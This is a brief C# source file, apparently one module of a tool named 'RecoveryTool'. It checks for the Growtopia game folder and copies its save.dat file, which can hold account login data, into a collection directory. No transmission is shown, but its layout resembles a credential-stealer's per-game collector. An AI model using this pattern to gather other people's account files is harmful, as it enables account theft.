using RecoveryTool.Recovery.Utilities;

namespace RecoveryTool.Recovery.Gaming.Games
{
    public class GrowtopiaService
    {
        public static async Task SaveGrowtopiaAsync()
        {
            string growtopiaFolder = Path.Combine(Common.LocalData, "Growtopia");
            if (!Directory.Exists(growtopiaFolder)) return;

            string destDir = Common.EnsureGrowtopiaPath();
            string saveFile = Path.Combine(growtopiaFolder, "save.dat");
            if (File.Exists(saveFile))
            {
                await CopyFileAsync(saveFile, Path.Combine(destDir, "save.dat"));
            }
        }

        private static async Task CopyFileAsync(string sourceFile, string destinationFile)
        {
            using FileStream sourceStream = new(sourceFile, FileMode.Open, FileAccess.Read, FileShare.Read, 4096, FileOptions.Asynchronous);
            using FileStream destinationStream = new(destinationFile, FileMode.Create, FileAccess.Write, FileShare.None, 4096, FileOptions.Asynchronous);
            await sourceStream.CopyToAsync(destinationStream);
        }
    }
}
